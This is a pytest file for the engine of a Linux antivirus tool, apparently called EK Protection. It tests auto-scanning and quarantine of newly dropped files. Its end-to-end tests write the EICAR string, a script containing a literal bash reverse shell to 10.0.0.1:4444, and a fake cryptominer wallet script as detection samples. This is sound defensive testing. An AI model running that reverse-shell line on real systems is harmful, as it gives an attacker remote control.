"""
tests/test_engine.py
=====================
Testes do EKEngine (core).
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from ekprotection.config.manager import ConfigManager
from ekprotection.core.engine import EKEngine, EngineState


@pytest.fixture
def cfg(tmp_path: Path) -> ConfigManager:
    manager = ConfigManager(tmp_path / "config.yaml")
    manager.load()
    return manager


class TestEngineState:
    def test_initial_state_is_stopped(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        assert engine.state == EngineState.STOPPED

    def test_is_running_false_initially(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        assert engine.is_running is False

    def test_status_returns_dict(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        status = engine.status()
        assert isinstance(status, dict)
        assert "state" in status
        assert "pid" in status
        assert "version" in status

    @pytest.mark.asyncio
    async def test_start_changes_state(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        await engine.start()
        assert engine.state == EngineState.RUNNING
        await engine.stop()

    @pytest.mark.asyncio
    async def test_stop_changes_state(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        await engine.start()
        await engine.stop()
        assert engine.state == EngineState.STOPPED

    @pytest.mark.asyncio
    async def test_double_start_raises(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        await engine.start()
        with pytest.raises(RuntimeError):
            await engine.start()
        await engine.stop()

    def test_register_subsystem(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        mock_subsystem = object()
        engine.register("test_module", mock_subsystem)
        assert engine.get_subsystem("test_module") is mock_subsystem

    def test_get_missing_subsystem_returns_none(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        assert engine.get_subsystem("nonexistent") is None


class TestAutoScanWiring:
    """Monitor -> scanner: executáveis novos são escaneados sem scan manual."""

    @pytest.fixture(autouse=True)
    def _isolated_data_dir(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # scanner/quarantine/exceptions/logs só abrem de verdade (sem sudo)
        # com EKP_DATA_DIR setado — sem isso caem em /var/lib/ek-protection
        # (root-owned) e o subsistema fica None.
        monkeypatch.setenv("EKP_DATA_DIR", str(tmp_path / "data"))

    @pytest.mark.asyncio
    async def test_callback_registered_by_default(self, cfg: ConfigManager) -> None:
        engine = EKEngine(cfg)
        await engine.start()
        try:
            assert engine._on_monitor_event_auto_scan in engine.monitor._callbacks
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_created_executable_triggers_scan_file(
        self, cfg: ConfigManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from ekprotection.monitor.events import FileEvent, FileEventKind

        engine = EKEngine(cfg)
        await engine.start()
        try:
            calls: list[str] = []
            monkeypatch.setattr(engine.scanner, "scan_file", lambda p: calls.append(str(p)))

            target = str(tmp_path / "dropped.sh")
            event = FileEvent(kind=FileEventKind.CREATED, path=target)
            await engine._on_monitor_event_auto_scan(event)

            assert calls == [target]
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_non_executable_extension_is_skipped(
        self, cfg: ConfigManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from ekprotection.monitor.events import FileEvent, FileEventKind

        engine = EKEngine(cfg)
        await engine.start()
        try:
            calls: list[str] = []
            monkeypatch.setattr(engine.scanner, "scan_file", lambda p: calls.append(str(p)))

            event = FileEvent(kind=FileEventKind.CREATED, path=str(tmp_path / "photo.jpg"))
            await engine._on_monitor_event_auto_scan(event)

            assert calls == []
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_deleted_and_modified_are_ignored(
        self, cfg: ConfigManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from ekprotection.monitor.events import FileEvent, FileEventKind

        engine = EKEngine(cfg)
        await engine.start()
        try:
            calls: list[str] = []
            monkeypatch.setattr(engine.scanner, "scan_file", lambda p: calls.append(str(p)))

            target = str(tmp_path / "app.bin")
            for kind in (FileEventKind.DELETED, FileEventKind.MODIFIED):
                await engine._on_monitor_event_auto_scan(FileEvent(kind=kind, path=target))

            assert calls == []
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_directory_events_are_skipped(
        self, cfg: ConfigManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from ekprotection.monitor.events import FileEvent, FileEventKind

        engine = EKEngine(cfg)
        await engine.start()
        try:
            calls: list[str] = []
            monkeypatch.setattr(engine.scanner, "scan_file", lambda p: calls.append(str(p)))

            event = FileEvent(kind=FileEventKind.CREATED, path=str(tmp_path / "somedir"), is_dir=True)
            await engine._on_monitor_event_auto_scan(event)

            assert calls == []
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_disabled_via_config_never_registers_callback(
        self, tmp_path: Path
    ) -> None:
        manager = ConfigManager(tmp_path / "config.yaml")
        manager.load()
        manager.set("monitor.auto_scan_new_executables", False)

        engine = EKEngine(manager)
        await engine.start()
        try:
            assert engine._on_monitor_event_auto_scan not in engine.monitor._callbacks
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_end_to_end_real_eicar_via_fs_watcher(
        self, tmp_path: Path
    ) -> None:
        """Dropa o EICAR real num path monitorado e espera o auto-scan
        detectar via inotify de verdade, sem chamar scan_file manualmente."""
        from ekprotection.logs.models import EventType, QueryFilter

        watched = tmp_path / "watch"
        watched.mkdir()

        manager = ConfigManager(tmp_path / "config.yaml")
        manager.load()
        manager.set("monitor.paths", [str(watched)])

        engine = EKEngine(manager)
        await engine.start()
        try:
            eicar = watched / "eicar_test.sh"
            eicar.write_bytes(
                b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
            )

            detected = False
            for _ in range(50):  # até ~5s
                await asyncio.sleep(0.1)
                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
                if any(e.file_path == str(eicar) for e in entries):
                    detected = True
                    break

            assert detected, "auto-scan não detectou o EICAR via monitor em tempo real"
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_end_to_end_simulated_reverse_shell_auto_quarantined(
        self, tmp_path: Path
    ) -> None:
        """Teste intenso de invasão simulada (checklist da tarefa diária):
        dropa um script com um reverse shell literal (inofensivo — nunca
        executado, só o padrão de texto que um invasor real usaria) num
        diretório monitorado de verdade e espera o pipeline completo —
        inotify real -> auto-scan -> HeuristicEngine -> auto-quarentena —
        reagir sozinho, sem nenhuma chamada manual a scan_file/quarantine.

        Cobre o achado desta rodada (03:00 2026-08-29): antes do fix em
        `HeuristicEngine._calculate_score` (piso de severidade) e em
        `ScanEngine._scan_file_inner` (heurística "crítico" agora vira
        THREAT), este cenário nunca era quarentenado automaticamente —
        ficava só como SUSPICIOUS/"baixo" no log, mesmo sendo um indicador
        inequívoco de reverse shell."""
        from ekprotection.logs.models import EventType, QueryFilter

        watched = tmp_path / "watch"
        watched.mkdir()

        manager = ConfigManager(tmp_path / "config.yaml")
        manager.load()
        manager.set("monitor.paths", [str(watched)])
        manager.set("quarantine.auto_quarantine_critical", True)

        engine = EKEngine(manager)
        await engine.start()
        try:
            evil = watched / "update.sh"
            evil.write_bytes(
                b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
            )

            quarantined = False
            for _ in range(50):  # até ~5s
                await asyncio.sleep(0.1)
                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
                match = next((e for e in entries if e.file_path == str(evil)), None)
                if match is not None and not evil.exists():
                    quarantined = True
                    break

            assert quarantined, (
                "auto-scan detectou mas não quarentenou automaticamente o "
                "reverse shell simulado via monitor em tempo real"
            )
            assert match.level.value == "CRITICAL"

            active = engine.quarantine.list_active()
            assert any(e.original_path == str(evil) for e in active)
        finally:
            await engine.stop()

    @pytest.mark.asyncio
    async def test_end_to_end_crypto_wallet_string_detected_not_quarantined(
        self, tmp_path: Path
    ) -> None:
        """Teste intenso de invasão simulada (checklist da tarefa diária,
        2026-09-04): dropa um script tipo dropper de cryptominer (config
        com endereço de carteira de payout, regra H018 — "Strings de
        Wallet Crypto", a regra mais diretamente ligada ao foco de proteção
        de criptoativos desta tarefa) num diretório monitorado de verdade.

        H018 é severidade "alto" (não "crítico") — diferente do reverse
        shell (08-29), o piso de severidade não deve elevar isso a
        "crítico" sozinho, então o comportamento correto é: detectado e
        logado como SUSPICIOUS, mas SEM auto-quarentena (arquivo continua
        no disco pra revisão manual). Nunca tinha sido validado via
        pipeline real (monitor->auto-scan->heurística) antes desta rodada
        — só via HeuristicContext construído manualmente em
        tests/test_heuristics.py::TestRuleH018CryptoStrings."""
        from ekprotection.logs.models import EventType, QueryFilter

        watched = tmp_path / "watch"
        watched.mkdir()

        manager = ConfigManager(tmp_path / "config.yaml")
        manager.load()
        manager.set("monitor.paths", [str(watched)])
        manager.set("quarantine.auto_quarantine_critical", True)

        engine = EKEngine(manager)
        await engine.start()
        try:
            evil = watched / "xmrig-update.sh"
            evil.write_bytes(
                b"#!/bin/bash\n"
                b"WALLET=0x0000000000000000000000000000000000dEaD\n"
                b"echo starting miner with wallet $WALLET\n"
            )

            match = None
            for _ in range(50):  # até ~5s
                await asyncio.sleep(0.1)
                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
                match = next((e for e in entries if e.file_path == str(evil)), None)
                if match is not None:
                    break

            assert match is not None, (
                "auto-scan não detectou a string de wallet crypto via "
                "monitor em tempo real"
            )
            assert match.level.value == "WARNING"
            assert evil.exists(), (
                "severidade 'alto' isolada não deveria disparar auto-quarentena"
            )
            assert not any(
                e.original_path == str(evil) for e in engine.quarantine.list_active()
            )
        finally:
            await engine.stop()
